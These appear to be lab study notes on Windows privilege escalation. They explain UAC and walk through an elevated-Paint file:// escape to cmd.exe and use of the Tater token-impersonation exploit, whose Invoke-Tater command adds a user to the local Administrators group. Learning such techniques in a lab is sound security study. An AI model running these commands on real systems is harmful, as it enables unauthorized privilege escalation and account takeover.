### What is UAC?

**UAC = User Account Control**.

It is a Windows security feature that prevents applications from silently performing actions that require **administrator privileges**.

For example, even if your account is a member of the **Administrators** group, Windows normally runs your programs with a **standard/filtered token**.

When a program needs elevated privileges, Windows displays:

> **Do you want to allow this app to make changes to your device?**

If you approve it, Windows starts the program with an **elevated administrator token**.

### Simple example

Without elevation:
```text
User
 ↓
cmd.exe
 ↓
Standard/filtered token
 ↓
Limited privileges
```

After UAC approval:
```text
User
 ↓
UAC prompt
 ↓
Administrator approval
 ↓
cmd.exe
 ↓
Elevated administrator token
```

You can check your current privileges with:
```cmd
whoami /priv
```

---

## What is a UAC Bypass?

A **UAC bypass** is a technique that allows a process to obtain **elevated administrator privileges without showing the normal UAC consent prompt**.

The important distinction is:
> **UAC bypass ≠ gaining administrator credentials.**

Usually, the attacker/user **already has an administrator account/token**, but Windows is running the current process with the filtered token. The bypass abuses a Windows/application behavior to get an elevated process.

Conceptually:
```text
Administrator account
        │
        ▼
Filtered token
        │
        │ UAC bypass
        ▼
Elevated administrator process
```

---

# Elevated Paint → Command Prompt

## Concept

The important concept is **a privileged GUI application exposing a way to launch another process**, allowing a low-privileged user to obtain an elevated command prompt. 

The important part is:
```text
Low-privileged user
        ↓
AdminPaint
        ↓
mspaint.exe running elevated
        ↓
Paint "Open" dialog
        ↓
file:// URL
        ↓
cmd.exe
        ↓
Elevated command prompt
```

This is a **lab-specific UAC bypass technique**. The exact behavior depends on the Windows version/configuration and the vulnerable application.

###  Launch AdminPaint

On the Windows desktop:
```text
AdminPaint
```

This launches:
```text
mspaint.exe
```

with administrative privileges.

###  Verify Paint's Privileges

Open Command Prompt:
```cmd
tasklist /V | findstr mspaint.exe
```

`tasklist.exe` and `findstr.exe` are **built into Windows**.

You should see `mspaint.exe` running.

The `/V` option displays verbose information about the process.

The important observation is that Paint was launched by the **AdminPaint** shortcut with elevated privileges.

### Use Paint's Open Dialog

Inside Paint:
```text
File → Open
```

In the file navigation/address input, enter:
```text
file://c:/windows/system32/cmd.exe
```

Press:
```text
Enter
```

The Open dialog processes the supplied `file://` path and launches:
```text
C:\Windows\System32\cmd.exe
```

Because Paint is already running with elevated privileges, the resulting command prompt inherits that elevated context.

### Verify the Privilege Level

In the newly opened command prompt:
```cmd
whoami /priv
```

Check that the command prompt is running with the expected administrative context.

## Attack Chain
```text
User
 ↓
AdminPaint shortcut
 ↓
Elevated mspaint.exe
 ↓
File → Open
 ↓
file://c:/windows/system32/cmd.exe
 ↓
cmd.exe launched
 ↓
cmd.exe inherits Paint's elevated token
 ↓
Elevated shell
```

---

#  Tater

### What is Tater?

**Tater** is a PowerShell exploit that abuses Windows **named pipes and token impersonation** to elevate privileges.

Tater is a PowerShell implementation of the **Hot Potato Windows Privilege** Escalation exploit.
https://github.com/Kevin-Robertson/Tater/tree/master

The important concept is **token impersonation**:

> A privileged Windows service can sometimes be tricked into authenticating to an attacker-controlled named pipe, allowing the attacker to impersonate that service's security token.

In the lab:
```powershell
powershell.exe -nop -ep bypass
```
    
- `-nop` → `-NoProfile`; don't load the user's PowerShell profile.
- `-ep bypass` → `-ExecutionPolicy Bypass`; bypass the current PowerShell execution-policy restriction for this process.

Then:
```powershell
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
```
Loads the **third-party Tater PowerShell script**.

Then:
```powershell
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

Tater performs the exploitation and attempts to execute the supplied command with elevated privileges.

The command:
```cmd
net localgroup administrators user /add
```

adds `user` to the local **Administrators** group.

Verify:
```cmd
net localgroup administrators
```


